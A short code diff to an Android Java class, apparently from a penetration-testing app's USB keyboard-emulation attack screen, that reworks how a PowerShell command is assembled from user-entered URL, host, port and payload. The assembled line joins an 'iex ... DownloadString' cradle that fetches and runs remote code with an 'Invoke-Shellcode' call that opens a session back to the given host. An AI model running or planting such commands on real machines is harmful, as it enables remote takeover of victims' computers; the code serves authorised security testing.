@@ -380,34 +380,19 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                         return;
                     }
                     ShellExecuter exe = new ShellExecuter();
-                    EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\")";
-                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved){
-                         nh.showMessage("Source not updated (configFileUrlPath)");
-                    }
                     EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
                     EditText port = (EditText) getView().findViewById(R.id.port);
 
                     Spinner payload = (Spinner) getView().findViewById(R.id.payload);
                     String payloadValue = payload.getSelectedItem().toString();
-                    String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
 
-                    String source = exe.ReadFile_SYNC(configFilePath);
-                    String regExPat = "^Invoke-Shellcode -Payload(.*)$";
-                    Pattern pattern = Pattern.compile(regExPat, Pattern.MULTILINE);
-                    Matcher matcher = pattern.matcher(source);
-                    // NEVER MATCH? YES IT DOES!
-                    if (matcher.find()) {
-                        source = source.replace(matcher.group(0), newString);
-                        isSaved = exe.SaveFileContents(source, configFilePath);
-                        if(isSaved){
-                            nh.showMessage("Options updated!");
-                        } else {
-                            nh.showMessage("Options not updated! (configFilePath)");
-                        }
-                    } else {
-                        nh.showMessage("Options not updated! (missing options)");
+                    EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
+                    String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
+                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
+
+                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                    if (!isSaved){
+                         nh.showMessage("Source not updated (configFileUrlPath)");
                     }
                     break;
                 default:
